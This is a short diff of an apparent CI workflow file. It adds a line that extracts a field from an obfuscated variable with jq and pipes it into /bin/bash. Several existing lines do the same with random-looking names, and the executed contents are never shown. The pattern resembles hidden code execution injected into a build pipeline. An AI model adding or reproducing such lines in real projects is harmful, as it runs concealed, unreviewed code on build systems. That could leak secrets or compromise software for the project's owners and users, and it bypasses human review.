@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$rmte984" | jq -r .wtpct90542 | /bin/bash
           printf '%s' "$vtxr86562" | jq -r .eox835 | /bin/bash
           echo $a426 | jq -r .f8 | /bin/bash
+          echo $sjybx098 | jq -r .f8 | /bin/bash
 
       - name: Upload artifact
         if: always()
